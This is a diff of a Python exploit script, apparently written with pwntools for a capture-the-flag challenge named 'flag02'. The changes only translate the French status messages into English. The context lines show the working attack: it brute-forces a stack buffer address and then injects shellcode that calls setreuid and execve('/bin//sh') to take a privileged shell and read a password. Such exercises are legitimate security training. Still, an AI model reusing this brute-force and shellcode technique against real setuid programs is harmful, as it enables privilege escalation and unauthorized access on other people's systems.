@@ -50,7 +50,7 @@ def try_addr(buf_addr, shellcode):
     finally:
         io.close()
 
-print("[*] Phase 1/2 : calibration de buf_addr...", flush=True)
+print("[*] Phase 1/2: calibrating buf_addr...", flush=True)
 FOUND = None
 lo, hi, step = 0x7ffffffd0000, 0x7ffffffff000, 0x10
 addr = hi - step
@@ -63,14 +63,14 @@ while addr >= lo:
         break
     count += 1
     if count % 500 == 0:
-        print(f"    ... {count} testees, dernier essai {hex(addr)}", flush=True)
+        print(f"    ... {count} tried, last {hex(addr)}", flush=True)
     addr -= step
 
 if FOUND is None:
-    print("[-] aucune adresse trouvee", flush=True)
+    print("[-] no address found", flush=True)
     sys.exit(1)
 
-print("[*] Phase 2/2 : setreuid + execve('/bin//sh')...", flush=True)
+print("[*] Phase 2/2: setreuid + execve('/bin//sh')...", flush=True)
 stage2 = asm(
     "push 0x6b; pop rax; syscall;"
     "mov rdi, rax; mov rsi, rax;"
@@ -98,6 +98,6 @@ out = io.recvall(timeout=3)
 print(out.decode(errors="replace"), flush=True)
 
 if b"flag02" in out:
-    print("[+] flag02, mot de passe affiche ci-dessus", flush=True)
+    print("[+] flag02, password printed above", flush=True)
 else:
-    print("[-] echec, voir sortie ci-dessus", flush=True)
+    print("[-] failed, see output above", flush=True)
